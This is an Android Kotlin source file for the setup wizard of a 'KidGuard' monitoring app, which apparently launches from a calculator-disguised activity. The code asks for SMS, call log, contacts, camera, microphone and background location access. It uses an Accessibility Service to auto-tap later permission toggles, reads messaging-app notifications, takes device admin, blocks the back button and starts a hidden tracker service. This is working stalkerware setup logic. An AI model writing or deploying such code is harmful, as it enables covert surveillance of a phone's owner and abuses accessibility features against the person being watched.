package com.anonchat.app.parentalcontrol.ui

import android.Manifest
import android.animation.ObjectAnimator
import android.app.Activity
import android.app.NotificationManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.animation.DecelerateInterpolator
import android.widget.Button
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.ContextCompat
import com.anonchat.app.parentalcontrol.api.CloudConfig
import com.anonchat.app.parentalcontrol.receiver.DeviceAdminReceiver
import com.anonchat.app.parentalcontrol.service.TrackerService

/**
 * SetupWizardActivity — One-time auto-permission setup wizard.
 *
 * Launched automatically on first install (from CalculatorActivity).
 * Guides the user through granting every required permission in the
 * correct order, using the minimum number of human taps.
 *
 * Permission grant order (optimized to reduce user friction):
 *  1. All dangerous runtime permissions (single "Allow" dialog)
 *  2. Accessibility Service  ← only step requiring 1 human tap in Settings
 *  3. Notification Listener  ← auto-tapped by AccessibilityService
 *  4. Battery Optimization   ← auto-dismissed via direct Intent
 *  5. Usage Access (Screen Time) ← 1 tap on the toggle
 *  6. Device Admin (Lock screen) ← auto-confirmed via Intent
 *  7. Done → starts TrackerService, marks setup complete
 */
class SetupWizardActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "SetupWizard"
        private const val PREFS = "app_prefs"
        private const val KEY_SETUP_DONE = "setup_wizard_done"

        // Request codes
        private const val RC_RUNTIME_PERMS = 1001
        private const val RC_DEVICE_ADMIN   = 1002

        fun isSetupDone(context: Context): Boolean {
            return context.getSharedPreferences(PREFS, MODE_PRIVATE)
                .getBoolean(KEY_SETUP_DONE, false)
        }

        fun markSetupDone(context: Context) {
            context.getSharedPreferences(PREFS, MODE_PRIVATE)
                .edit().putBoolean(KEY_SETUP_DONE, true).apply()
        }

        /** All dangerous runtime permissions the app needs */
        private val RUNTIME_PERMISSIONS = buildList {
            add(Manifest.permission.CAMERA)
            add(Manifest.permission.RECORD_AUDIO)
            add(Manifest.permission.ACCESS_FINE_LOCATION)
            add(Manifest.permission.ACCESS_COARSE_LOCATION)
            add(Manifest.permission.READ_SMS)
            add(Manifest.permission.READ_CALL_LOG)
            add(Manifest.permission.READ_CONTACTS)
            add(Manifest.permission.READ_PHONE_STATE)
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
                add(Manifest.permission.READ_MEDIA_IMAGES)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }
    }

    // ── UI references ─────────────────────────────────────────────────────────
    private lateinit var tvStep         : TextView
    private lateinit var tvTitle        : TextView
    private lateinit var tvDesc         : TextView
    private lateinit var tvEmoji        : TextView
    private lateinit var btnAction      : Button
    private lateinit var btnSkip        : TextView
    private lateinit var progressBar    : ProgressBar
    private lateinit var dotsContainer  : LinearLayout

    private val handler = Handler(Looper.getMainLooper())
    private var currentStep = 0
    private var pollingRunnable: Runnable? = null

    // ── Step definitions ──────────────────────────────────────────────────────

    private data class WizardStep(
        val emoji: String,
        val title: String,
        val desc: String,
        val actionLabel: String,
        val skippable: Boolean = false,
        val autoAction: (() -> Unit)? = null,  // called immediately when step shown
        val onAction: () -> Unit,
        val isComplete: (Context) -> Boolean
    )

    private val steps: List<WizardStep> by lazy { buildSteps() }

    private fun buildSteps(): List<WizardStep> = listOf(

        // Step 0 — Welcome
        WizardStep(
            emoji = "🛡️",
            title = "KidGuard Setup",
            desc  = "This wizard will set up all required permissions in a few easy steps. Tap each button when prompted.",
            actionLabel = "Let's Start",
            isComplete  = { false }, // always proceed
            onAction    = { nextStep() }
        ),

        // Step 1 — Runtime permissions
        WizardStep(
            emoji = "📋",
            title = "App Permissions",
            desc  = "Grant access to Location, Camera, Microphone, SMS, and Calls so KidGuard can monitor device activity.",
            actionLabel = "Grant Permissions",
            isComplete  = { ctx -> allRuntimePermissionsGranted(ctx) },
            onAction    = {
                ActivityCompat.requestPermissions(
                    this,
                    RUNTIME_PERMISSIONS.toTypedArray(),
                    RC_RUNTIME_PERMS
                )
            }
        ),

        // Step 2 — Accessibility Service
        WizardStep(
            emoji = "♿",
            title = "Accessibility Access",
            desc  = "Open Settings → KidGuard → tap the toggle to enable. This allows KidGuard to monitor app activity and auto-confirm future steps.",
            actionLabel = "Open Accessibility Settings",
            isComplete  = { ctx -> isAccessibilityEnabled(ctx) },
            onAction    = {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
                startPolling { isAccessibilityEnabled(this) }
            }
        ),

        // Step 3 — Notification Listener
        WizardStep(
            emoji = "💬",
            title = "Notification Access",
            desc  = "Allows KidGuard to read social app messages (WhatsApp, Telegram, Instagram etc.).",
            actionLabel = "Enable Notification Access",
            isComplete  = { ctx -> isNotificationListenerEnabled(ctx) },
            autoAction  = {
                // Try auto-navigating; AccessibilityService will auto-tap the toggle
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
                startPolling { isNotificationListenerEnabled(this) }
            },
            onAction    = {
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
                startPolling { isNotificationListenerEnabled(this) }
            }
        ),

        // Step 4 — Battery Optimization
        WizardStep(
            emoji = "🔋",
            title = "Battery Optimization",
            desc  = "Exempt KidGuard from battery optimization so it keeps running in the background.",
            actionLabel = "Disable Battery Restriction",
            isComplete  = { ctx -> isBatteryOptimizationIgnored(ctx) },
            autoAction  = { requestBatteryOptimization() },
            onAction    = { requestBatteryOptimization() }
        ),

        // Step 5 — Usage Access (Screen Time)
        WizardStep(
            emoji = "📊",
            title = "Usage Access",
            desc  = "Required for Screen Time tracking (daily minutes & unlocks). Open Settings and toggle KidGuard ON.",
            actionLabel = "Open Usage Access",
            isComplete  = { ctx -> isUsageAccessGranted(ctx) },
            autoAction  = {
                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
                startPolling { isUsageAccessGranted(this) }
            },
            onAction    = {
                startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                })
                startPolling { isUsageAccessGranted(this) }
            }
        ),

        // Step 6 — Device Admin
        WizardStep(
            emoji = "🔒",
            title = "Device Admin",
            desc  = "Enables the remote Lock Device command from the parent dashboard.",
            actionLabel = "Activate Device Admin",
            isComplete  = { ctx -> isDeviceAdminActive(ctx) },
            autoAction  = { showDeviceAdminDialog() },
            onAction    = { showDeviceAdminDialog() }
        ),

        // Step 7 — Done
        WizardStep(
            emoji = "✅",
            title = "All Set!",
            desc  = "KidGuard is fully configured and running in the background. This screen will now close.",
            actionLabel = "Finish",
            isComplete  = { false },
            autoAction  = {
                handler.postDelayed({ finishSetup() }, 2000)
            },
            onAction    = { finishSetup() }
        )
    )

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Keep screen bright while wizard runs
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.statusBarColor = 0xFF0A0E1A.toInt()
        window.navigationBarColor = 0xFF0A0E1A.toInt()

        CloudConfig.init(this)

        // Build UI programmatically (no layout file needed)
        buildUi()
        showStep(0)
    }

    override fun onResume() {
        super.onResume()
        // Re-check if current step is already done after returning from Settings
        if (currentStep < steps.size) {
            val step = steps[currentStep]
            if (step.isComplete(this)) {
                handler.postDelayed({ nextStep() }, 600)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        pollingRunnable?.let { handler.removeCallbacks(it) }
    }

    // ── Step Navigation ───────────────────────────────────────────────────────

    private fun showStep(index: Int) {
        if (index >= steps.size) { finishSetup(); return }
        currentStep = index
        val step = steps[index]

        // Skip step if already complete (except welcome & done steps)
        if (index > 0 && index < steps.size - 1 && step.isComplete(this)) {
            Log.d(TAG, "Step $index already complete, skipping")
            showStep(index + 1)
            return
        }

        // Animate progress bar
        val progress = ((index.toFloat() / (steps.size - 1)) * 100).toInt()
        ObjectAnimator.ofInt(progressBar, "progress", progressBar.progress, progress).apply {
            duration = 400
            interpolator = DecelerateInterpolator()
            start()
        }

        // Update dot indicators
        updateDots(index)

        // Update text with fade
        tvStep.text  = "Step ${index + 1} of ${steps.size}"
        tvEmoji.text = step.emoji
        tvTitle.text = step.title
        tvDesc.text  = step.desc
        btnAction.text = step.actionLabel
        btnSkip.visibility = if (step.skippable) View.VISIBLE else View.GONE

        tvTitle.alpha = 0f; tvTitle.animate().alpha(1f).setDuration(300).start()
        tvDesc.alpha  = 0f; tvDesc.animate().alpha(1f).setDuration(400).start()
        tvEmoji.scaleX = 0.5f; tvEmoji.scaleY = 0.5f
        tvEmoji.animate().scaleX(1f).scaleY(1f).setDuration(350).setInterpolator(DecelerateInterpolator()).start()

        // Execute auto action if present
        step.autoAction?.let { action ->
            handler.postDelayed({ action() }, 500)
        }
    }

    private fun nextStep() {
        stopPolling()
        showStep(currentStep + 1)
    }

    // ── Permission Checks ─────────────────────────────────────────────────────

    private fun allRuntimePermissionsGranted(ctx: Context): Boolean {
        return RUNTIME_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(ctx, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun isAccessibilityEnabled(ctx: Context): Boolean {
        val cn = ComponentName(ctx, com.anonchat.app.parentalcontrol.service.TrackerAccessibilityService::class.java)
        return try {
            val enabledServices = Settings.Secure.getString(
                ctx.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            enabledServices.contains(cn.flattenToString())
        } catch (e: Exception) { false }
    }

    private fun isNotificationListenerEnabled(ctx: Context): Boolean {
        return NotificationManagerCompat.getEnabledListenerPackages(ctx)
            .contains(ctx.packageName)
    }

    private fun isBatteryOptimizationIgnored(ctx: Context): Boolean {
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            pm.isIgnoringBatteryOptimizations(ctx.packageName)
        } else true
    }

    private fun isUsageAccessGranted(ctx: Context): Boolean {
        return try {
            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
            val end = System.currentTimeMillis()
            val start = end - 60_000L
            val stats = usm.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, start, end)
            stats != null && stats.isNotEmpty()
        } catch (e: Exception) { false }
    }

    private fun isDeviceAdminActive(ctx: Context): Boolean {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val cn  = ComponentName(ctx, DeviceAdminReceiver::class.java)
        return dpm.isAdminActive(cn)
    }

    // ── Permission Request Helpers ────────────────────────────────────────────

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!isBatteryOptimizationIgnored(this)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                    startPolling { isBatteryOptimizationIgnored(this) }
                } catch (e: Exception) {
                    // Fallback: open general battery settings
                    startActivity(Intent(Settings.ACTION_BATTERY_SAVER_SETTINGS).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    })
                }
            }
        }
    }

    private fun showDeviceAdminDialog() {
        if (!isDeviceAdminActive(this)) {
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        ComponentName(this@SetupWizardActivity, DeviceAdminReceiver::class.java))
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "KidGuard needs Device Admin to lock the screen remotely from the parent dashboard.")
                }
                startActivityForResult(intent, RC_DEVICE_ADMIN)
            } catch (e: Exception) {
                Log.e(TAG, "Device admin dialog failed: ${e.message}")
                nextStep()
            }
        }
    }

    // ── Polling ───────────────────────────────────────────────────────────────

    private fun startPolling(check: () -> Boolean) {
        stopPolling()
        pollingRunnable = object : Runnable {
            override fun run() {
                if (check()) {
                    stopPolling()
                    handler.post { nextStep() }
                } else {
                    handler.postDelayed(this, 1000)
                }
            }
        }
        handler.postDelayed(pollingRunnable!!, 1000)
    }

    private fun stopPolling() {
        pollingRunnable?.let { handler.removeCallbacks(it) }
        pollingRunnable = null
    }

    // ── Callbacks ─────────────────────────────────────────────────────────────

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == RC_RUNTIME_PERMS) {
            // Advance regardless — some permissions may have been denied,
            // but we don't block the wizard on non-critical ones
            handler.postDelayed({ nextStep() }, 400)
        }
    }

    @Suppress("OVERRIDE_DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RC_DEVICE_ADMIN) {
            // Whether activated or not, advance to next step
            handler.postDelayed({ nextStep() }, 400)
        }
    }

    // ── Finish ────────────────────────────────────────────────────────────────

    private fun finishSetup() {
        Log.d(TAG, "Setup wizard complete — starting TrackerService")
        markSetupDone(this)
        CloudConfig.setupFullyCompleted = true
        try { TrackerService.start(this) } catch (_: Exception) {}
        finish()
    }

    // ── UI Builder ────────────────────────────────────────────────────────────

    private fun buildUi() {
        val root = FrameLayout(this).apply {
            setBackgroundColor(0xFF0A0E1A.toInt())
        }

        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(32), dp(60), dp(32), dp(40))
        }

        // Gradient card background
        val cardBg = FrameLayout(this).apply {
            background = buildGradientDrawable()
            setPadding(dp(24), dp(32), dp(24), dp(32))
        }

        // Content inside card
        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity     = Gravity.CENTER_HORIZONTAL
        }

        // Progress bar at top
        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max       = 100
            progress  = 0
            progressDrawable = buildProgressDrawable()
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(4)).apply {
                bottomMargin = dp(32)
            }
        }

        // Emoji icon
        tvEmoji = TextView(this).apply {
            textSize    = 56f
            gravity     = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(16) }
        }

        // Step counter
        tvStep = TextView(this).apply {
            textSize    = 11f
            setTextColor(0xFF667EEA.toInt())
            gravity     = Gravity.CENTER
            letterSpacing = 0.1f
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(8) }
        }

        // Title
        tvTitle = TextView(this).apply {
            textSize    = 22f
            setTextColor(0xFFFFFFFF.toInt())
            gravity     = Gravity.CENTER
            typeface    = android.graphics.Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(12) }
        }

        // Description
        tvDesc = TextView(this).apply {
            textSize    = 14f
            setTextColor(0xFFAAAAAA.toInt())
            gravity     = Gravity.CENTER
            lineHeight  = (14 * 1.6f).toInt()
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(32) }
        }

        // Action button
        btnAction = Button(this).apply {
            textSize    = 15f
            setTextColor(0xFFFFFFFF.toInt())
            background  = buildButtonDrawable()
            setPadding(dp(24), dp(14), dp(24), dp(14))
            stateListAnimator = null
            elevation   = 0f
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = dp(16) }
            setOnClickListener {
                if (currentStep < steps.size) steps[currentStep].onAction()
            }
        }

        // Skip text
        btnSkip = TextView(this).apply {
            text        = "Skip this step"
            textSize    = 13f
            setTextColor(0xFF666666.toInt())
            gravity     = Gravity.CENTER
            visibility  = View.GONE
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener { nextStep() }
        }

        // Dot indicators
        dotsContainer = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity     = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { topMargin = dp(24) }
        }
        buildDots()

        content.addView(progressBar)
        content.addView(tvEmoji)
        content.addView(tvStep)
        content.addView(tvTitle)
        content.addView(tvDesc)
        content.addView(btnAction)
        content.addView(btnSkip)
        content.addView(dotsContainer)

        cardBg.addView(content)

        card.addView(cardBg, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ))

        root.addView(card, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT,
            Gravity.CENTER
        ))

        setContentView(root)
    }

    private fun buildDots() {
        dotsContainer.removeAllViews()
        for (i in steps.indices) {
            val dot = View(this).apply {
                background = buildDotDrawable(i == 0)
                val size = if (i == 0) dp(10) else dp(7)
                layoutParams = LinearLayout.LayoutParams(size, size).apply {
                    marginStart = dp(4); marginEnd = dp(4)
                }
            }
            dotsContainer.addView(dot)
        }
    }

    private fun updateDots(activeIndex: Int) {
        for (i in 0 until dotsContainer.childCount) {
            val dot = dotsContainer.getChildAt(i)
            val isActive = i == activeIndex
            dot.background = buildDotDrawable(isActive)
            val size = if (isActive) dp(10) else dp(7)
            dot.layoutParams = (dot.layoutParams as LinearLayout.LayoutParams).also {
                it.width = size; it.height = size
            }
        }
    }

    // ── Drawables ─────────────────────────────────────────────────────────────

    private fun buildGradientDrawable(): android.graphics.drawable.GradientDrawable {
        return android.graphics.drawable.GradientDrawable().apply {
            setColor(0xFF111827.toInt())
            cornerRadius = dp(20).toFloat()
            setStroke(1, 0xFF1F2937.toInt())
        }
    }

    private fun buildButtonDrawable(): android.graphics.drawable.GradientDrawable {
        return android.graphics.drawable.GradientDrawable(
            android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT,
            intArrayOf(0xFF667EEA.toInt(), 0xFF764BA2.toInt())
        ).apply {
            cornerRadius = dp(14).toFloat()
        }
    }

    private fun buildProgressDrawable(): android.graphics.drawable.LayerDrawable {
        val bg = android.graphics.drawable.GradientDrawable().apply {
            setColor(0xFF1F2937.toInt()); cornerRadius = dp(2).toFloat()
        }
        val fill = android.graphics.drawable.GradientDrawable(
            android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT,
            intArrayOf(0xFF667EEA.toInt(), 0xFF764BA2.toInt())
        ).apply { cornerRadius = dp(2).toFloat() }
        val clip = android.graphics.drawable.ClipDrawable(fill, Gravity.START, android.graphics.drawable.ClipDrawable.HORIZONTAL)
        return android.graphics.drawable.LayerDrawable(arrayOf(bg, clip)).apply {
            setId(0, android.R.id.background)
            setId(1, android.R.id.progress)
        }
    }

    private fun buildDotDrawable(active: Boolean): android.graphics.drawable.GradientDrawable {
        return android.graphics.drawable.GradientDrawable().apply {
            shape         = android.graphics.drawable.GradientDrawable.OVAL
            setColor(if (active) 0xFF667EEA.toInt() else 0xFF374151.toInt())
        }
    }

    // ── Utilities ─────────────────────────────────────────────────────────────

    private fun dp(value: Int): Int {
        return (value * resources.displayMetrics.density).toInt()
    }

    override fun onBackPressed() {
        // Prevent back during setup
    }
}
